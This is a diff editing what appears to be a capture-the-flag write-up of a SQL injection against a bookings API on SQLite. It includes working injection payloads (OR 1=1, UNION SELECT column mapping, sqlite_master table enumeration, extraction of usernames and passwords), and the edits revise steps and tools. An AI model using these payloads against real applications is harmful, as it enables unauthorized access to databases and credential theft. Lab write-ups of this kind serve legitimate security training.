@@ -71,9 +71,9 @@ JWT Bearer token for API authentication
 ## Attack Chain Visualization
 ```
 ┌─────────────────────┐     ┌──────────────────────┐     ┌─────────────────────┐
-│  Reconnaissance     │────▶│  Injection Discovery  │────▶│  Filter Analysis    │
-│  Map API endpoints  │     │  ?status=pending'     │     │  Functions blocked  │
-│  /api/bookings      │     │  Error confirms SQLi  │     │  Subselects blocked │
+│  Reconnaissance     │────▶│  Injection Discovery │────▶│  Filter Analysis    │
+│  Map API endpoints  │     │  ?status=pending'    │     │  Functions blocked  │
+│  /api/bookings      │     │  Error confirms SQLi │     │  Subselects blocked │
 └─────────────────────┘     └──────────────────────┘     └─────────────────────┘
                                                                    │
                                                                    ▼
@@ -108,9 +108,9 @@ Authorization: Bearer <jwt>
 
 Boolean confirmation:
 ```http
-GET /api/bookings?status=' OR 1=1-- HTTP/1.1
+GET /api/bookings?status=pending' OR 1=1-- HTTP/1.1
 ```
-**Result:** Returned all bookings regardless of status.
+**Result:** Returned bookings or empty array.
 
 ### Step 2: Determine Column Count
 Used ORDER BY to binary search for column count:
@@ -122,7 +122,7 @@ Used ORDER BY to binary search for column count:
 
 ### Step 3: Map Output Positions
 ```http
-GET /api/bookings?status=' UNION SELECT 1,2,3,...,26-- HTTP/1.1
+GET /api/bookings?status=pending' UNION SELECT 1,2,3,...,26-- HTTP/1.1
 ```
 **Result:** All 26 positions visible. Key mappings: status=18, created_at=19, created_by_username=26.
 
@@ -153,12 +153,7 @@ Instead of using subselects or aggregate functions, make sqlite_master the FROM 
 ```http
 GET /api/bookings?status=' UNION SELECT 1,2,...,17,name,19,...,26 FROM sqlite_master LIMIT 1-- HTTP/1.1
 ```
-**Result:** First table name returned. Iterated with `LIMIT 1 OFFSET N` to enumerate all tables.
-
-Got schema with the sql column:
-```http
-GET /api/bookings?status=' UNION SELECT 1,2,...,17,sql,19,...,26 FROM sqlite_master LIMIT 1 OFFSET 0-- HTTP/1.1
-```
+**Result:** First table name returned. Iterated with `LIMIT 1 OFFSET N` to enumerate all tables. Discovered "users" table.
 
 ### Step 6: Extract Credentials and Flag
 ```http
@@ -192,7 +187,7 @@ GET /api/bookings?status=' UNION SELECT 1,2,...,17,username,password,20,...,26 F
 ---
 
 ## Tools Used
-- **Burp Suite** — Request interception and Repeater for testing injection payloads
+- **Caido** — Request interception and Repeater for testing injection payloads
 - **SQLMap** — Ran in parallel (did not find the bypass — manual testing required)
 - **Firefox + PwnFox** — Initial app reconnaissance and request capture
 
